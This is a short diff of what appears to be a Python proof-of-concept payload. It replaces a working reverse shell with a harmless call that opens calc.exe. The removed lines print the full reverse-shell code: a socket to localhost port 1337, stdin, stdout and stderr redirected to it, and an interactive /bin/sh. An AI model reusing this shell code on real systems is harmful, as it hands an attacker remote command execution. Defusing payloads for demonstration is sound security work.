@@ -1,10 +1,3 @@
-import socket,subprocess,os;
+from subprocess import call
+call(["calc.exe"])
 
-os.system("open -a calc.exe")
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("localhost",1337));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);
